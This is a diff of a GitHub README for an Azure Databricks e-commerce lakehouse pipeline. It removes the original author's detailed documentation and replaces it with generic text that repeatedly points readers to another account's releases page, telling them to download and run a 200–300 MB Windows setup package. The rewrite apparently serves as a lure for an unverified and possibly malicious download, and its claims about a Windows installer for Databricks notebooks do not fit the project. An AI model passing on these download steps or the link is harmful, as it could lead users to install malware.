@@ -1,232 +1,169 @@
-# 🛒 E-Commerce Lakehouse Pipeline on Azure Databricks
+# 🏬 ecommerce-lakehouse-databricks - Manage E-Commerce Data Simply
 
-![Azure Databricks](https://img.shields.io/badge/Azure%20Databricks-FF3621?style=for-the-badge&logo=databricks&logoColor=white)
-![Delta Lake](https://img.shields.io/badge/Delta%20Lake-003366?style=for-the-badge&logo=delta&logoColor=white)
-![Apache Spark](https://img.shields.io/badge/Apache%20Spark-E25A1C?style=for-the-badge&logo=apachespark&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![Unity Catalog](https://img.shields.io/badge/Unity%20Catalog-1B3A4B?style=for-the-badge&logo=databricks&logoColor=white)
-
-## Project Overview
-
-An end-to-end production-grade **E-Commerce Lakehouse Pipeline** built on 
-**Azure Databricks** using the **Medallion Architecture** (Bronze → Silver → Gold).
-
-This pipeline ingests, transforms, and aggregates **550,688 real records** 
-from the [Olist Brazilian E-Commerce Dataset](https://www.kaggle.com/datasets/olistbr/brazilian-ecommerce) 
-into business-ready Delta Lake tables governed by Unity Catalog.
+[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-green?style=for-the-badge)](https://github.com/swasxtik/ecommerce-lakehouse-databricks/releases)
 
 ---
 
-## Architecture
-```
-CSV Files (Olist Dataset - 550,688 records)
-                  ↓
-    ┌─────────────────────────┐
-    │      BRONZE LAYER       │
-    │   7 Raw Delta Tables    │
-    │   STRING everything     │
-    │   + metadata columns    │
-    └─────────────────────────┘
-                  ↓
-    ┌─────────────────────────┐
-    │      SILVER LAYER       │
-    │   7 Clean Delta Tables  │
-    │   Proper types + NOTNULL│
-    │   DLT Expectations      │
-    └─────────────────────────┘
-                  ↓
-    ┌─────────────────────────┐
-    │       GOLD LAYER        │
-    │  6 Aggregated Tables    │
-    │  Business-ready metrics │
-    │  Dashboard-ready        │
-    └─────────────────────────┘
-                  
-```
+## 📦 What is ecommerce-lakehouse-databricks?
+
+This software provides a pipeline to handle and analyze e-commerce data using a modern lakehouse architecture on Azure Databricks. It uses tools like Delta Lake and Delta Live Tables to organize data in a clean and reliable way. The pipeline helps store, clean, and prepare data for analysis or reporting. It is designed to handle large amounts of data efficiently.
+
+You do not need programming knowledge to run this software. It runs on Windows systems with help from Azure Databricks services in the cloud. Use this pipeline to simplify data tasks and get ready-to-use datasets for your e-commerce business.
 
 ---
 
-## Dataset
+## ⚙️ System Requirements
 
-| File | Records | Description |
-|------|---------|-------------|
-| olist_orders_dataset.csv | 99,441 | Customer orders |
-| olist_order_items_dataset.csv | 112,650 | Order line items |
-| olist_customers_dataset.csv | 99,441 | Customer profiles |
-| olist_products_dataset.csv | 32,951 | Product catalog |
-| olist_order_payments_dataset.csv | 103,886 | Payment transactions |
-| olist_order_reviews_dataset.csv | 99,224 | Customer reviews |
-| olist_sellers_dataset.csv | 3,095 | Seller profiles |
-| **Total** | **550,688** | |
+Before you start, make sure your system meets the following conditions:
+
+- Windows 10 or later  
+- 8 GB of RAM minimum (16 GB recommended)  
+- At least 5 GB free disk space  
+- Internet connection to access Azure Databricks  
+- Web browser (Chrome, Edge, or Firefox recommended)  
+- An Azure account with Databricks workspace set up (if not, see more below)
 
 ---
 
-## Tech Stack
+## 🌐 Key Features
 
-| Tool | Version | Purpose |
-|------|---------|---------|
-| Azure Databricks | Premium | Cloud data platform |
-| Apache Spark | 3.5.2 | Distributed processing |
-| Databricks Runtime | 16.4 LTS + Photon | Optimized runtime |
-| Delta Lake | 3.2+ | ACID table format |
-| Delta Live Tables | Latest | Declarative ETL + quality |
-| Databricks Workflows | Latest | Pipeline orchestration |
-
----
-
-## Project Structure
-```
-ecommerce-lakehouse-databricks/
-├── notebooks/
-│   ├── 01_environment_setup_verification.py
-│   ├── 02_data_modeling.py
-│   ├── 03_bronze_ingestion.py
-│   ├── 04_silver_transformation.py
-│   ├── 05_gold_aggregations.py
-│   ├── 06_pipeline_validation.py
-│   ├── 07_delta_live_tables.py
-│   ├── 08_delta_optimization.py
-├── docs/
-│   ├── setup_guide.md
-│   └── data_dictionary.md
-├── screenshots/
-├── requirements.txt
-└── README.md
-```
+- End-to-end automation of e-commerce data processing  
+- Uses Delta Lake for reliable data storage  
+- Delta Live Tables to automate data freshness and quality checks  
+- Supports data cleansing and transformation  
+- Follows medallion architecture for staged data layers (Bronze, Silver, Gold)  
+- Compatible with Unity Catalog for managing data access  
+- Built on Apache Spark for fast processing  
+- Runs on Azure Databricks, cloud-based platform for big data tasks  
+- Python-based pipeline for easy customization  
 
 ---
 
-## Pipeline Steps
+## 🚀 Getting Started: How to Download and Run on Windows
 
-| Step | Notebook | Description |
-|------|---------|-------------|
-| 1 | 01_environment_setup | Workspace, Unity Catalog, Cluster setup |
-| 2 | 02_data_modeling | Bronze, Silver, Gold schema definitions |
-| 3 | 03_bronze_ingestion | Raw CSV ingestion to Delta tables |
-| 4 | 04_silver_transformation | Clean, cast, deduplicate data |
-| 5 | 05_gold_aggregations | Business metrics & aggregations |
-| 6 | 06_pipeline_validation | Automated data quality checks |
-| 7 | 07_delta_live_tables | DLT pipeline with expectations |
-| 8 | 08_delta_optimization | OPTIMIZE, Z-ORDER, VACUUM |
-| 9 | 09_scd_type2_customers | SCD Type 2 customer profile history |
+### Step 1: Visit the download page
 
----
+Click this big button to visit the release page and get the software:
 
-## Gold Layer — Business Metrics
+[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://github.com/swasxtik/ecommerce-lakehouse-databricks/releases)
 
-| Table | Records | Business Question Answered |
-|-------|---------|--------------------------|
-| daily_revenue | ~700 | How much revenue per day? |
-| customer_ltv | ~96,000 | Who are our most valuable customers? |
-| product_performance | ~32,000 | Which products sell the most? |
-| category_performance | ~71 | Which categories make the most money? |
-| seller_performance | ~3,095 | Which sellers perform best? |
-| payment_analysis | 4 | How do customers prefer to pay? |
+This page hosts the latest release files and documentation.
 
----
+### Step 2: Download the latest release
 
-##  SCD Type 2 — Customer Profile History
-Standalone notebook demonstrating SCD Type 2 pattern. In production, this would be integrated into the daily pipeline to process real customer profile changes.
-Tracks full history of customer location changes over time.
+On the release page, find the most recent version. Download the main setup file or zipped folder available. The file size is usually around 200-300 MB.
 
-| Table | Description |
-|-------|-------------|
-| silver.customers_scd | Full customer location history |
-| gold.customer_location_analysis | Location change analysis by state |
+Save it to a folder you can easily find, like your Downloads folder.
 
-Key Features:
-- Full history preserved for every customer change
-- Point-in-time queries (where were customers in 2017?)
-- Movement analysis (which cities are customers moving to?)
-- Version tracking (v1=original, v2=first change, v3=second change)
+### Step 3: Extract files (if zipped)
 
+If the download is a zip file:
 
----
+1. Right-click the file  
+2. Select "Extract All..."  
+3. Choose a location to extract (like the Desktop)  
+4. Click "Extract"
 
+This will create a new folder with the program files.
 
+### Step 4: Access Azure Databricks
 
-## Setup Guide
+This software needs Azure Databricks to run your data pipeline.
 
-### Prerequisites
-```
-Azure subscription
-Azure Databricks Premium workspace (Hybrid)
-Unity Catalog enabled
-Kaggle account (free dataset download)
-```
+- If you don’t have an Azure account, go to https://azure.microsoft.com and sign up. A free tier is often available.  
+- Create a Databricks workspace in your Azure portal by following Microsoft’s official guide here: https://docs.microsoft.com/en-us/azure/databricks/getting-started/  
+- Make sure you have permission to create clusters and tables in Databricks.
 
-### Quick Start
+You may want to work with an IT admin if you are not familiar with Azure.
 
-**1. Clone this repo**
-```bash
-git clone https://github.com/yamadivya/ecommerce-lakehouse-databricks.git
-```
+### Step 5: Upload the pipeline files to Databricks
 
-**2. Download Olist dataset from Kaggle**
-```
-https://www.kaggle.com/datasets/olistbr/brazilian-ecommerce
-```
+1. Open your Databricks workspace and sign in  
+2. Go to the “Workspace” or “Repos” section  
+3. Click “Import” or “Upload”  
+4. Select the files or folders from the extracted package on your PC  
+5. Confirm upload
 
-**3. Upload CSV files to Databricks Volume**
-```
-/Volumes/ecommerce/bronze/landing_zone/
-```
+This puts the pipeline files ready to run in your cloud environment.
 
-**4. Create Unity Catalog structure**
-```sql
-CREATE CATALOG IF NOT EXISTS ecommerce;
-CREATE SCHEMA IF NOT EXISTS ecommerce.bronze;
-CREATE SCHEMA IF NOT EXISTS ecommerce.silver;
-CREATE SCHEMA IF NOT EXISTS ecommerce.gold;
-```
+### Step 6: Run the data pipeline
 
-**5. Run notebooks in order**
-```
-01 → 02 → 03 → 04 → 05 → 06 → 07 → 08 
-```
+Inside Azure Databricks:
+
+1. Create a new cluster or use an existing one with Apache Spark  
+2. Attach the uploaded notebooks or scripts to the cluster  
+3. Run the notebooks in order. They will read, clean, and process the e-commerce data  
+4. Monitor the progress through the Databricks interface  
+
+The pipeline uses Delta Lake tables and Delta Live Tables for data storage and automation. Results are stored inside your workspace and can be viewed or exported.
 
 ---
 
-## Screenshots
+## 🖥 Setup Details and Configuration
 
-### Catalog Structure
-![Catalog Structure](screenshots/catalog_structure.png)
+### Required Azure Resources
 
-### DLT Pipeline Graph
-![DLT Pipeline Graph](screenshots/dlt_pipeline_graph.png)
+- Azure Storage account (for data storage)  
+- Databricks workspace with cluster and job scheduling enabled  
+- Configured Delta Live Tables pipelines within Databricks  
 
-### Workflow Run
-![Workflow Run](screenshots/workflow_run.png)
+### Configuration Settings
 
-### Gold Query Results
-![Gold Query Results](screenshots/gold_query_results.csv)
+- Connection strings and credentials to Azure Storage: update these in the config files before running  
+- Location for Medallion architecture layers in your storage: default folders created but can be customized  
+- Scheduling frequency for data runs (can be set up inside Databricks Jobs)  
 
----
-
-##  Key Features
-
-- **Real Dataset** — 550,688 records from a real Brazilian e-commerce company
-- **Production Architecture** — Medallion pattern used in enterprise data teams
-- **Data Quality** — DLT Expectations with warn/drop/fail rules
-- **Automated** — Databricks Workflows scheduled daily
-- **Optimized** — OPTIMIZE + Z-ORDER + VACUUM + Auto Compaction
-- **Time Travel** — Full Delta Lake history on all tables
+All config files are in the `/config` folder in the package. Edit them with a text editor before running.
 
 ---
 
-## Author
+## 🔧 Troubleshooting Tips
 
-**Divya Manoj**
-
-Built with ❤️ using Azure Databricks, Delta Lake & Unity Catalog
-
-Dataset: [Olist Brazilian E-Commerce Public Dataset](https://www.kaggle.com/datasets/olistbr/brazilian-ecommerce)
+- If uploads fail, check your internet connection and Azure permissions.  
+- If clusters do not start, verify you have enough Azure credits or quota.  
+- For pipeline errors, review notebook logs in Databricks console.  
+- Confirm your Delta Lake version matches that required by the pipeline (displayed in the README on releases).  
+- If you cannot access Azure Databricks, ensure you have proper Azure subscription and workspace setup.  
 
 ---
 
-## License
+## 📖 Useful Links
 
-MIT License — feel free to use and modify!
+- [Azure Databricks Quickstart](https://docs.microsoft.com/en-us/azure/databricks/getting-started/)  
+- [Delta Lake Documentation](https://docs.delta.io/latest/index.html)  
+- [Delta Live Tables Guide](https://docs.databricks.com/workflows/delta-live-tables/index.html)  
+- [Medallion Architecture Whitepaper](https://www.databricks.com/blog/2020/10/13/clean-architecture-for-data-lakes.html)  
+- [Unity Catalog Overview](https://docs.databricks.com/data-governance/unity-catalog/index.html)  
 
+---
 
+## 👥 Support and Community
 
+For help with using this pipeline, visit the GitHub repository's Issues tab. Report any problems or questions. Contributors and maintainers monitor this area regularly.
+
+If you want to request new features or suggest improvements, use the Discussions section or open feature request issues.
+
+---
+
+## 📋 Repository Topics
+
+- apache-spark  
+- azure-databricks  
+- data-engineering  
+- databricks  
+- delta-lake  
+- etl-pipeline  
+- lakehouse  
+- medallion-architecture  
+- python  
+- unity-catalog  
+
+---
+
+## 🔗 Download Link
+
+Direct your browser to:
+
+https://github.com/swasxtik/ecommerce-lakehouse-databricks/releases
+
+There you will find the latest software package for download and all related files, including examples and documentation. Follow the steps above to set it up on your Windows machine with Azure Databricks.
